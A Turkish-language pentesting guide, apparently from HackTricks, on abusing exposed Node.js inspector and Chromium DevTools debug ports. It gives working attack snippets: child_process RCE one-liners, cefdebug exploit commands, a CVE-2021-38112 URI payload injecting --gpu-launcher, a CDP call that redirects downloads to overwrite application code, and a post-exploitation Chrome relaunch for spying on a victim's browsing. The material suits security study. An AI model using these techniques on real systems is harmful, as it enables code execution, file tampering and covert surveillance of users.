# Node inspector/CEF debug abuse

Tarihsel pratik örnekler arasında Multimaster walkthrough ve CVE-2019-1414 Visual Studio Code debugger saldırısı bulunur; bunları, her güncel Electron veya Chromium hedefinin aynı primitive'leri sunduğunu varsaymak yerine sürüme özgü bağlam olarak kullanın.<sup>[[1]](#references)[[3]](#references)</sup>

## Temel Bilgiler

[Belgelerde](https://nodejs.org/learn/getting-started/debugging) belirtildiği üzere: `--inspect` switch'iyle başlatıldığında bir Node.js process'i bir debugging client'ını dinler. **Varsayılan olarak**, **`127.0.0.1:9229`** host ve port'unda dinleme yapar. Her process'e ayrıca **benzersiz** bir **UUID** atanır.<sup>[[4]](#references)</sup>

Inspector client'ları bağlanmak için host adresini, port'u ve UUID'yi bilmeli ve belirtmelidir. Tam URL, `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` gibi görünür.<sup>[[4]](#references)</sup>

> [!WARNING]
> **Debugger, Node.js execution environment'a tam erişime sahip olduğundan**, bu port'a bağlanabilen kötü amaçlı bir actor, Node.js process'i adına arbitrary code çalıştırabilir (**potential privilege escalation**).<sup>[[4]](#references)</sup>

Bir inspector'ı başlatmanın çeşitli yolları vardır:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
İncelenen bir işlemi başlattığınızda buna benzer bir şey görünür:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) tabanlı process'ler, `--remote-debugging-port=9222` ile bir debugger açığa çıkarabilir. Bu, tarayıcıyı Node.js inspector yerine [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden açığa çıkarır; bu nedenle Node.js `process` tabanlı payload'lar varsayılan olarak doğrudan uygulanamaz.<sup>[[2]](#references)[[5]](#references)</sup>

Debug edilen bir tarayıcıyı başlattığınızda şuna benzer bir çıktı görünür:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browser'lar, WebSockets ve same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Bir web-browser'da açılan web siteleri, browser security model kapsamında WebSocket ve HTTP istekleri gönderebilir. **Benzersiz bir debugger session id elde etmek** için **ilk HTTP bağlantısı** gereklidir. **Same-origin-policy**, web sitelerinin **bu HTTP bağlantısını** kurmasını **engeller**. [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**'lerine** karşı ek güvenlik amacıyla Node.js, bağlantı için kullanılan **'Host' header'larının** ya bir **IP address** ya da tam olarak **`localhost`** belirttiğini doğrular.<sup>[[4]](#references)</sup>

> [!TIP]
> Bu **security measure**, yalnızca **bir HTTP request göndererek** (bir SSRF vuln exploit edilerek yapılabilir) inspector'ın exploit edilip code çalıştırılmasını **engeller**.<sup>[[4]](#references)</sup>

### Çalışan process'lerde inspector'ı başlatma

Çalışan bir nodejs process'ine **SIGUSR1 signal'ı** göndererek inspector'ı varsayılan portta **başlatmasını** sağlayabilirsiniz. Ancak yeterli privileges'a sahip olmanız gerektiğini unutmayın; bu, process içindeki bilgilere **privileged access** sağlayabilir, ancak doğrudan privilege escalation sağlamaz.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Bu, container'larda kullanışlıdır; çünkü `--inspect` ile **process'i kapatıp yeni bir process başlatmak**, **container** process ile birlikte **sonlandırılacağı** için bir seçenek **değildir**.<sup>[[6]](#references)</sup>

### Inspector/debugger'a bağlanma

**Chromium tabanlı bir browser'a** bağlanmak için Chrome veya Edge'de sırasıyla `chrome://inspect` ya da `edge://inspect` URL'lerine erişilebilir. Configure düğmesine tıklayarak **hedef host ve portun** doğru şekilde listelendiğinden emin olunmalıdır. Görselde bir Remote Code Execution (RCE) örneği gösterilmektedir:<sup>[[2]](#references)[[4]](#references)</sup>

![Debugger'a erişmek için bir URL görünecektir. Örneğin ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Inspector/debugger'a bağlanma: Chromium tabanlı bir browser'a bağlanmak için ...](<../../images/image (674).png>)

**Command line** kullanarak bir debugger/inspector'a şununla bağlanabilirsiniz:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) aracı, yerel olarak çalışan **inspector'ları bulmaya** ve bunlara **code inject etmeye** olanak tanır.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> **Chrome DevTools Protocol** aracılığıyla bir browser'a [bağlanıldığında](https://chromedevtools.github.io/devtools-protocol/) **NodeJS RCE exploit'lerinin çalışmayacağını** unutmayın (bununla yapılabilecek ilginç şeyleri bulmak için API'yi kontrol etmeniz gerekir).<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector'da RCE

> [!TIP]
> Buraya bir Electron'daki XSS'ten [**RCE elde etmenin yolunu arayarak geldiyseniz bu sayfayı kontrol edin.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Bir Node **inspector**'ına **bağlanabildiğinizde** **RCE** elde etmenin yaygın yollarından bazıları aşağıdakine benzer bir şey kullanmaktır (**Chrome DevTools protocol** bağlantısında bunun çalışmayacağı anlaşılıyor):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

API'yi burada inceleyebilirsiniz: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Bu bölümde, insanların bu protokolü exploit etmek için kullandığını gördüğüm ilginç şeyleri listeleyeceğim.

### Deep Links üzerinden Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) kapsamında Rhino security, CEF tabanlı bir uygulamanın sistemde özel bir **UR**I (workspaces://index.html) kaydettiğini; bu URI'nin tamamını aldığını ve ardından URI'den kısmen oluşturulan bir yapılandırmayla **CEF tabanlı uygulamayı başlattı**ğını keşfetti.<sup>[[8]](#references)</sup>

URI parametrelerinin URL decode edildiği ve CEF tabanlı uygulamayı başlatmak için kullanıldığı keşfedildi. Bu durum, bir kullanıcının **command line** içine **`--gpu-launcher`** flag'ini **inject** etmesine ve keyfi işlemler yürütmesine olanak sağlıyordu.<sup>[[8]](#references)</sup>

Dolayısıyla aşağıdaki gibi bir payload:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
`calc.exe` çalıştırılır.<sup>[[8]](#references)</sup>

### Dosyaların Üzerine Yazma

**indirilen dosyaların kaydedileceği klasörü** değiştirin ve uygulamanın sık kullanılan **kaynak kodunu**, **kötü amaçlı kodunuzla** üzerine yazmak için bir dosya indirin.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE ve veri sızdırma

STAR Labs, açığa çıkarılmış WebDriver/CDP servislerinin keyfi dosya okumayı ve RCE'yi etkinleştirebileceğini gösterdi; bazı yapılandırmalarda DNS rebinding exploit zincirini tamamlayabilir.<sup>[[9]](#references)</sup>

Geçmiş browser-automation ve Chromium security vakaları için Counter WebDriver write-up'ına ve Project Zero issues 773, 1742 ve 1944'e bakın.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

Gerçek bir ortamda ve **Chrome/Chromium tabanlı browser kullanan bir kullanıcı PC'sini compromise ettikten sonra**, **debugging etkinleştirilmiş ve debugging portu port-forward edilmiş** bir Chrome process'i başlatarak ona erişebilirsiniz. Bu şekilde **victim'ın Chrome ile yaptığı her şeyi inceleyebilir ve hassas bilgileri çalabilirsiniz**.<sup>[[7]](#references)</sup>

Gizli yöntem, **tüm Chrome process'lerini sonlandırmak** ve ardından şuna benzer bir şey çalıştırmaktır:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inceleme ve exploitation aracı](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code üzerinden Chrome DevTools Debugger ile Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Başlarken](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Browsing Sessions'ı Uzaktan Gözlemlemek ve Kontrol Etmek için Chrome'un Debugging Özelliğini Abuse Etme](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Benimle mi Konuşuyorsun? - DNS Rebinding ve CDP üzerinden WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Webdriver'a Karşı - Bot'tan RCE'ye](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
